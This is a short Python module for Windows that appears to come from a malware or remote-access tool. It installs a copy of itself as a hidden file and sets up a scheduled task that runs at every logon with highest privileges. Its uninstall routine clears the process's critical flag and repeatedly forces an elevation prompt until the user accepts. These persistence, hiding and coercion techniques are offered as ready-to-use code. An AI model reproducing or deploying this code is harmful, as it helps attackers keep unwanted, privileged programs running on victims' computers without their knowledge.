# Import modules

import os
import shutil
from ctypes import windll, byref, c_bool
from subprocess import Popen, check_output, DEVNULL, CalledProcessError


# Adding a script to startup

def AddToAutorun(AutorunName, InstallPath, ProcessName):
 Popen('schtasks /create /f /sc onlogon /rl highest /tn "' + AutorunName + '" /tr "' + InstallPath + '\\' + ProcessName + '"',
  shell=True)

def CopyToAutorun(CurrentPath, InstallPath, ProcessName):
 shutil.copy2(CurrentPath, r'' + InstallPath + '\\' + ProcessName)
 windll.kernel32.SetFileAttributesW(InstallPath + '\\' + ProcessName, 2)


# Checking if a task exists in the task scheduler

schtasks = '@chcp 65001 && @schtasks.exe'


def SchtasksExists(AutorunName):
 try:
  process = check_output(f'{schtasks} /query /tn \"{AutorunName}\"',
   shell=True, stderr=DEVNULL, stdin=DEVNULL).decode(encoding='utf-8', errors='strict')
 except CalledProcessError:
  return False
 else:
  return not 'ERROR:' in process


# Checking if a file exists in the installed directory

def InstallPathExists(InstallPath, ProcessName):
 if os.path.exists(InstallPath + '\\' + ProcessName):
  return True


# Removes itself from the system

def Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Directory):
 windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
 windll.kernel32.SetFileAttributesW(CurrentPath, 0)
 windll.kernel32.SetFileAttributesW(InstallPath + '\\' + ProcessName, 0)

 with open(os.path.join(Directory, 'Uninstaller.bat'), 'w') as OPATH:
   OPATH.writelines(['taskkill /f /im "' + CurrentName + '"\n', 
                     'schtasks /delete /f /tn "'+AutorunName+'"\n', 
                     'del /s /q /f "' + CurrentPath + '"\n',
                     'del /s /q /f "' + InstallPath + '\\' + ProcessName + '"\n',
                     'rmdir /s /q "' + Directory + '"'])

 while True:
  try:
   os.startfile(Directory + 'Uninstaller.bat', 'runas')
  except:
   pass
  else:
   break